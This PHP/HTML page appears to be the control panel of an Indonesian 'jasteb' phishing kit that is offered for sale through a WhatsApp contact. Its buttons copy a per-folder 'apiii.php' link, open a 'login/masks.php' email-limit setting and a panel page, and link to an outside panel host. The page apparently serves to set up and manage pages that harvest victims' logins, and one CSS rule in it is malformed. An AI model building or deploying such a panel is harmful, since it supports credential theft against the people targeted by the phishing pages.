<?php
$folder = isset($_GET['folder']) ? filter_var($_GET['folder'], FILTER_SANITIZE_STRING) : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝗪𝗲𝗯 𝗣𝗮𝗻𝗲𝗹 𝗝𝗮𝘀𝘁𝗲𝗯 𝗦𝘂𝗸𝘀𝗲𝘀 𝗗𝗶 𝗕𝘂𝗮𝘁</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-image: url('https://itzpire.com/file/b858daf35401.jpg');
            background-size: cover;
            background-position: center;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #333;
        }

        .panel {
            background-color: rgba(128, 128, 128, 0.7); /* Semi-transparent gray */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .panel h2 
            margin-bottom: 25px;
            color: #007BFF;
        }

        .button-group {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .button-group button {
            background-color: #4a4a4a; /* Dark gray color */
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
            transition: background-color 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
        }

        .button-group button:hover {
            background-color: #636363; /* Slightly lighter gray on hover */
        }

        .fa-icon {
            margin-right: 10px;
        }

        .copyright {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }

        a {
            color: #007BFF;
            text-decoration: none;
        }

        a:hover {
            color: #0056b3;
        }

        .contact-links {
            margin-top: 10px;
        }

        .contact-links a {
            margin: 0 5px;
        }

        .contact-links a.whatsapp-link {
            color: #25D366; /* WhatsApp green color */
        }

        .contact-links a.whatsapp-link:hover {
            color: #128C7E; /* Darker WhatsApp green on hover */
        }
    </style>
</head>
<body>
    <div class="panel">
        <h2>𝗽𝗮𝗻𝗲𝗹 𝗷𝗮𝘀𝘁𝗲𝗯 𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗱𝗶 𝗯𝘂𝗮𝘁</h2>

        <div class="button-group">
            <button onclick="copyLink()">
                <i class="fas fa-copy fa-icon"></i>
                𝗦𝗔𝗟𝗜𝗡 𝗔𝗣𝗜𝗜𝗜 𝗣𝗔𝗡𝗘𝗟
            </button>
            <button onclick="openSettings3()">
                <i class="fas fa-link fa-icon"></i>
                𝗔𝗧𝗨𝗥 𝗠𝗔𝗫𝗦 𝗘𝗠𝗔𝗜𝗟 𝗣𝗔𝗡𝗘𝗟
            </button>
            <button onclick="openSettings()">
                <i class="fas fa-envelope fa-icon"></i>
                𝗕𝗨𝗞𝗔 𝗣𝗔𝗡𝗘𝗟 𝗝𝗔𝗦𝗧𝗘𝗕
            </button>
            <button onclick="openSettings2()">
                <i class="fas fa-globe fa-icon"></i>
                𝗞𝗢𝗡𝗘𝗞 𝗣𝗔𝗡𝗘𝗟
            </button>
        </div>

        <div class="copyright">
            <div>©SORK </div>
            <div class="contact-links">
                <a href="https://wa.me/6285370786474" target="_blank" class="whatsapp-link"><i class="fab fa-whatsapp"></i> WhatsApp</a>
                <a href="https://wa.me/6285370786474" target="_blank"><i class="fab fa-telegram-plane"></i>𝗕𝗨𝗬 𝗦𝗖</a>
            </div>
        </div>
    </div>

    <script>
        function copyLink() {
            const link = `${window.location.origin}/files/<?php echo $folder; ?>/apiii.php`;
            navigator.clipboard.writeText(link).then(() => {
                alert("Link copied successfully!");
            }).catch(err => {
                alert("Failed to copy link");
            });
        }

        function openSettings() {
            const settingsUrl = `/files/<?php echo $folder; ?>/dafzx`;
            window.location.href = settingsUrl;
        }
        
        function openSettings2() {
            window.location.href = "https://pusatfierydevil.dafzx.biz.id/babi.php";
        }
        
        function openSettings3() {
            const settingsUrl = `/files/<?php echo $folder; ?>/login/masks.php`;
            window.location.href = settingsUrl;
        }
    </script>
</body>
</html>
